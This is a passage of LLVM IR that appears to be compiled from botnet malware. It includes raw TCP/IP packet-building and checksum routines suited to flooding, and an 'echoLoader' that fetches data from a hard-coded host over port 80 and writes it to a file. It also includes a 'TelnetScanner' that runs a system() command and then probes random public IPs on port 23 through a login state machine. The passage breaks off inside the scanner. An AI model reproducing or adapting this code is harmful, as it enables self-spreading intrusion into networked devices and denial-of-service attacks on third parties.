  %41 = xor i64 %40, -1
  %42 = trunc i64 %41 to i16
  ret i16 %42
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local zeroext i16 @tcpcsum(%struct.iphdr* %0, %struct.tcphdr* %1) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #15
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias align 16 i8* @malloc(i64 %28) #12
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %32, i8* align 8 %33, i64 24, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %36, i8* align 1 %38, i64 20, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #12
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #9

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @makeIPPacket(%struct.iphdr* %0, i32 %1, i32 %2, i8 zeroext %3, i32 %4) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @sclose(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

6:                                                ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

7:                                                ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

10:                                               ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @socket_connect(i8* %0, i16 zeroext %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i16, align 2
  %5 = alloca %struct.hostent*, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i16 %1, i16* %4, align 2
  store i32 1, i32* %7, align 4
  %9 = load i8*, i8** %3, align 8
  %10 = call %struct.hostent* @gethostbyname(i8* %9)
  store %struct.hostent* %10, %struct.hostent** %5, align 8
  %11 = icmp eq %struct.hostent* %10, null
  br i1 %11, label %12, label %13

12:                                               ; preds = %2
  call void @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.47, i64 0, i64 0)) #12
  call void @exit(i32 1) #16
  unreachable

13:                                               ; preds = %2
  %14 = load %struct.hostent*, %struct.hostent** %5, align 8
  %15 = getelementptr inbounds %struct.hostent, %struct.hostent* %14, i32 0, i32 4
  %16 = load i8**, i8*** %15, align 8
  %17 = getelementptr inbounds i8*, i8** %16, i64 0
  %18 = load i8*, i8** %17, align 8
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %20 = bitcast %struct.in_addr* %19 to i8*
  %21 = load %struct.hostent*, %struct.hostent** %5, align 8
  %22 = getelementptr inbounds %struct.hostent, %struct.hostent* %21, i32 0, i32 3
  %23 = load i32, i32* %22, align 4
  %24 = sext i32 %23 to i64
  call void @bcopy(i8* %18, i8* %20, i64 %24) #12
  %25 = load i16, i16* %4, align 2
  %26 = call zeroext i16 @htons(i16 zeroext %25) #15
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %26, i16* %27, align 2
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = call i32 @socket(i32 2, i32 1, i32 6) #12
  store i32 %29, i32* %8, align 4
  %30 = load i32, i32* %8, align 4
  %31 = bitcast i32* %7 to i8*
  %32 = call i32 @setsockopt(i32 %30, i32 6, i32 1, i8* %31, i32 4) #12
  %33 = load i32, i32* %8, align 4
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %35, label %36

35:                                               ; preds = %13
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.48, i64 0, i64 0))
  call void @exit(i32 1) #16
  unreachable

36:                                               ; preds = %13
  %37 = load i32, i32* %8, align 4
  %38 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %39 = call i32 @connect(i32 %37, %struct.sockaddr* %38, i32 16)
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

41:                                               ; preds = %36
  call void @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.49, i64 0, i64 0))
  call void @exit(i32 1) #16
  unreachable

42:                                               ; preds = %36
  %43 = load i32, i32* %8, align 4
  ret i32 %43
}

declare %struct.hostent* @gethostbyname(i8*) #5

; Function Attrs: nounwind
declare void @herror(i8*) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #10

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

declare void @perror(i8*) #5

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @echoLoader() #0 {
  %1 = alloca [512 x i8], align 16
  %2 = alloca i32, align 4
  %3 = alloca %struct._IO_FILE*, align 8
  %4 = call i32 @socket_connect(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.50, i64 0, i64 0), i16 zeroext 80)
  store i32 %4, i32* %2, align 4
  %5 = load i32, i32* %2, align 4
  %6 = call i64 @write(i32 %5, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.51, i64 0, i64 0), i64 13)
  %7 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %7, i8 0, i64 512, i1 false)
  br label %8

8:                                                ; preds = %13, %0
  %9 = load i32, i32* %2, align 4
  %10 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i64 0, i64 0
  %11 = call i64 @read(i32 %9, i8* %10, i64 511)
  %12 = icmp ne i64 %11, 0
  br i1 %12, label %13, label %21

13:                                               ; preds = %8
  %14 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.52, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.53, i64 0, i64 0))
  store %struct._IO_FILE* %14, %struct._IO_FILE** %3, align 8
  %15 = load %struct._IO_FILE*, %struct._IO_FILE** %3, align 8
  %16 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i64 0, i64 0
  %17 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %15, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.54, i64 0, i64 0), i8* %16)
  %18 = load %struct._IO_FILE*, %struct._IO_FILE** %3, align 8
  %19 = call i32 @fclose(%struct._IO_FILE* %18)
  %20 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %20, i8 0, i64 512, i1 false)
  br label %8, !llvm.loop !36

21:                                               ; preds = %8
  %22 = load i32, i32* %2, align 4
  %23 = call i32 @shutdown(i32 %22, i32 2) #12
  %24 = load i32, i32* %2, align 4
  %25 = call i32 @close(i32 %24)
  ret void
}

declare i64 @write(i32, i8*, i64) #5

declare noalias %struct._IO_FILE* @fopen(i8*, i8*) #5

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #5

declare i32 @fclose(%struct._IO_FILE*) #5

; Function Attrs: nounwind
declare i32 @shutdown(i32, i32) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @TelnetScanner() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.fd_set, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i64, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca %struct.fd_set*, align 8
  %15 = call i32 @getdtablesize() #12
  %16 = sdiv i32 %15, 4
  %17 = mul nsw i32 %16, 3
  store i32 %17, i32* %1, align 4
  %18 = load i32, i32* %1, align 4
  %19 = icmp sgt i32 %18, 512
  br i1 %19, label %20, label %21

20:                                               ; preds = %0
  br label %23

21:                                               ; preds = %0
  %22 = load i32, i32* %1, align 4
  br label %23

23:                                               ; preds = %21, %20
  %24 = phi i32 [ 512, %20 ], [ %22, %21 ]
  store i32 %24, i32* %1, align 4
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %25, align 4
  %26 = call zeroext i16 @htons(i16 zeroext 23) #15
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %26, i16* %27, align 2
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %29 = getelementptr inbounds [8 x i8], [8 x i8]* %28, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %29, i8 0, i64 8, i1 false)
  %30 = load i32, i32* %1, align 4
  %31 = zext i32 %30 to i64
  %32 = call i8* @llvm.stacksave()
  store i8* %32, i8** %9, align 8
  %33 = alloca %struct.telstate_t, i64 %31, align 16
  store i64 %31, i64* %10, align 8
  %34 = bitcast %struct.telstate_t* %33 to i8*
  %35 = load i32, i32* %1, align 4
  %36 = sext i32 %35 to i64
  %37 = mul i64 %36, 5
  call void @llvm.memset.p0i8.i64(i8* align 16 %34, i8 0, i64 %37, i1 false)
  store i32 0, i32* %2, align 4
  br label %38

38:                                               ; preds = %57, %23
  %39 = load i32, i32* %2, align 4
  %40 = load i32, i32* %1, align 4
  %41 = icmp slt i32 %39, %40
  br i1 %41, label %42, label %60

42:                                               ; preds = %38
  %43 = load i32, i32* %2, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %44
  %46 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i32 0, i32 3
  store i8 1, i8* %46, align 1
  %47 = call noalias align 16 i8* @malloc(i64 1024) #12
  %48 = load i32, i32* %2, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %49
  %51 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i32 0, i32 8
  store i8* %47, i8** %51, align 8
  %52 = load i32, i32* %2, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %53
  %55 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %54, i32 0, i32 8
  %56 = load i8*, i8** %55, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %56, i8 0, i64 1024, i1 false)
  br label %57

57:                                               ; preds = %42
  %58 = load i32, i32* %2, align 4
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %2, align 4
  br label %38, !llvm.loop !37

60:                                               ; preds = %38
  %61 = call i32 @system(i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.55, i64 0, i64 0))
  %62 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 5, i64* %62, align 8
  %63 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 0, i64* %63, align 8
  br label %64

64:                                               ; preds = %2314, %60
  br label %65

65:                                               ; preds = %64
  store i32 0, i32* %2, align 4
  br label %66

66:                                               ; preds = %2311, %65
  %67 = load i32, i32* %2, align 4
  %68 = load i32, i32* %1, align 4
  %69 = icmp slt i32 %67, %68
  br i1 %69, label %70, label %2314

70:                                               ; preds = %66
  %71 = load i32, i32* %2, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %72
  %74 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %73, i32 0, i32 2
  %75 = load i8, i8* %74, align 8
  %76 = zext i8 %75 to i32
  switch i32 %76, label %2310 [
    i32 0, label %77
    i32 1, label %234
    i32 2, label %398
    i32 3, label %709
    i32 4, label %777
    i32 5, label %1138
    i32 6, label %1206
    i32 7, label %1908
    i32 8, label %1936
    i32 9, label %1964
    i32 10, label %2018
    i32 11, label %2029
    i32 12, label %2057
  ]

77:                                               ; preds = %70
  %78 = load i32, i32* %2, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %79
  %81 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %80, i32 0, i32 8
  %82 = load i8*, i8** %81, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %82, i8 0, i64 1024, i1 false)
  %83 = load i32, i32* %2, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %84
  %86 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %85, i32 0, i32 3
  %87 = load i8, i8* %86, align 1
  %88 = icmp ne i8 %87, 0
  br i1 %88, label %89, label %109

89:                                               ; preds = %77
  %90 = load i32, i32* %2, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %91
  %93 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %92, i32 0, i32 8
  %94 = load i8*, i8** %93, align 8
  store i8* %94, i8** %12, align 8
  %95 = load i32, i32* %2, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %96
  %98 = bitcast %struct.telstate_t* %97 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %98, i8 0, i64 32, i1 false)
  %99 = load i8*, i8** %12, align 8
  %100 = load i32, i32* %2, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %101
  %103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %102, i32 0, i32 8
  store i8* %99, i8** %103, align 8
  %104 = call i32 @getRandomPublicIP()
  %105 = load i32, i32* %2, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %106
  %108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %107, i32 0, i32 1
  store i32 %104, i32* %108, align 4
  br label %148

109:                                              ; preds = %77
  %110 = load i32, i32* %2, align 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %111
  %113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %112, i32 0, i32 5
  %114 = load i8, i8* %113, align 1
  %115 = add i8 %114, 1
  store i8 %115, i8* %113, align 1
  %116 = load i32, i32* %2, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %117
  %119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %118, i32 0, i32 5
  %120 = load i8, i8* %119, align 1
  %121 = zext i8 %120 to i64
  %122 = icmp eq i64 %121, 13
  br i1 %122, label %123, label %134

123:                                              ; preds = %109
  %124 = load i32, i32* %2, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %125
  %127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %126, i32 0, i32 5
  store i8 0, i8* %127, align 1
  %128 = load i32, i32* %2, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %129
  %131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %130, i32 0, i32 4
  %132 = load i8, i8* %131, align 2
  %133 = add i8 %132, 1
  store i8 %133, i8* %131, align 2
  br label %134

134:                                              ; preds = %123, %109
  %135 = load i32, i32* %2, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %136
  %138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %137, i32 0, i32 4
  %139 = load i8, i8* %138, align 2
  %140 = zext i8 %139 to i64
  %141 = icmp eq i64 %140, 4
  br i1 %141, label %142, label %147

142:                                              ; preds = %134
  %143 = load i32, i32* %2, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %144
  %146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %145, i32 0, i32 3
  store i8 1, i8* %146, align 1
  br label %2311

147:                                              ; preds = %134
  br label %148

148:                                              ; preds = %147, %89
  %149 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %149, align 4
  %150 = call zeroext i16 @htons(i16 zeroext 23) #15
  %151 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %150, i16* %151, align 2
  %152 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %153 = getelementptr inbounds [8 x i8], [8 x i8]* %152, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %153, i8 0, i64 8, i1 false)
  %154 = load i32, i32* %2, align 4
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %155
  %157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %156, i32 0, i32 1
  %158 = load i32, i32* %157, align 4
  %159 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %160 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %159, i32 0, i32 0
  store i32 %158, i32* %160, align 4
  %161 = call i32 @socket(i32 2, i32 1, i32 0) #12
  %162 = load i32, i32* %2, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %163
  %165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %164, i32 0, i32 0
  store i32 %161, i32* %165, align 16
  %166 = load i32, i32* %2, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %167
  %169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %168, i32 0, i32 0
  %170 = load i32, i32* %169, align 16
  %171 = bitcast %struct.timeval* %11 to i8*
  %172 = call i32 @setsockopt(i32 %170, i32 1, i32 20, i8* %171, i32 16) #12
  %173 = load i32, i32* %2, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %174
  %176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %175, i32 0, i32 0
  %177 = load i32, i32* %176, align 16
  %178 = bitcast %struct.timeval* %11 to i8*
  %179 = call i32 @setsockopt(i32 %177, i32 1, i32 21, i8* %178, i32 16) #12
  %180 = load i32, i32* %2, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %181
  %183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %182, i32 0, i32 0
  %184 = load i32, i32* %183, align 16
  %185 = icmp eq i32 %184, -1
  br i1 %185, label %186, label %187

186:                                              ; preds = %148
  br label %2311

187:                                              ; preds = %148
  %188 = load i32, i32* %2, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %189
  %191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %190, i32 0, i32 0
  %192 = load i32, i32* %191, align 16
  %193 = load i32, i32* %2, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %194
  %196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %195, i32 0, i32 0
  %197 = load i32, i32* %196, align 16
  %198 = call i32 (i32, i32, ...) @fcntl(i32 %197, i32 3, i8* null)
  %199 = or i32 %198, 2048
  %200 = call i32 (i32, i32, ...) @fcntl(i32 %192, i32 4, i32 %199)
  %201 = load i32, i32* %2, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %202
  %204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %203, i32 0, i32 0
  %205 = load i32, i32* %204, align 16
  %206 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %207 = call i32 @connect(i32 %205, %struct.sockaddr* %206, i32 16)
  %208 = icmp eq i32 %207, -1
  br i1 %208, label %209, label %224

209:                                              ; preds = %187
  %210 = call i32* @__errno_location() #15
  %211 = load i32, i32* %210, align 4
  %212 = icmp ne i32 %211, 115
  br i1 %212, label %213, label %224

213:                                              ; preds = %209
  %214 = load i32, i32* %2, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %215
  %217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %216, i32 0, i32 0
  %218 = load i32, i32* %217, align 16
  %219 = call i32 @sclose(i32 %218)
  %220 = load i32, i32* %2, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %221
  %223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %222, i32 0, i32 3
  store i8 1, i8* %223, align 1
  br label %233

224:                                              ; preds = %209, %187
  %225 = load i32, i32* %2, align 4
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %226
  %228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %227, i32 0, i32 2
  store i8 1, i8* %228, align 8
  %229 = load i32, i32* %2, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %230
  %232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %231, i32 0, i32 6
  store i32 0, i32* %232, align 4
  br label %233

233:                                              ; preds = %224, %213
  br label %2310

234:                                              ; preds = %70
  %235 = load i32, i32* %2, align 4
  %236 = sext i32 %235 to i64
  %237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %236
  %238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %237, i32 0, i32 6
  %239 = load i32, i32* %238, align 4
  %240 = icmp eq i32 %239, 0
  br i1 %240, label %241, label %248

241:                                              ; preds = %234
  %242 = call i64 @time(i64* null) #12
  %243 = trunc i64 %242 to i32
  %244 = load i32, i32* %2, align 4
  %245 = sext i32 %244 to i64
  %246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %245
  %247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %246, i32 0, i32 6
  store i32 %243, i32* %247, align 4
  br label %248

248:                                              ; preds = %241, %234
  br label %249

249:                                              ; preds = %248
  store %struct.fd_set* %4, %struct.fd_set** %14, align 8
  store i32 0, i32* %13, align 4
  br label %250

250:                                              ; preds = %260, %249
  %251 = load i32, i32* %13, align 4
  %252 = zext i32 %251 to i64
  %253 = icmp ult i64 %252, 16
  br i1 %253, label %254, label %263

254:                                              ; preds = %250
  %255 = load %struct.fd_set*, %struct.fd_set** %14, align 8
  %256 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %255, i32 0, i32 0
  %257 = load i32, i32* %13, align 4
  %258 = zext i32 %257 to i64
  %259 = getelementptr inbounds [16 x i64], [16 x i64]* %256, i64 0, i64 %258
  store i64 0, i64* %259, align 8
  br label %260

260:                                              ; preds = %254
  %261 = load i32, i32* %13, align 4
  %262 = add i32 %261, 1
  store i32 %262, i32* %13, align 4
  br label %250, !llvm.loop !38

263:                                              ; preds = %250
  br label %264

264:                                              ; preds = %263
  br label %265

265:                                              ; preds = %264
  %266 = load i32, i32* %2, align 4
  %267 = sext i32 %266 to i64
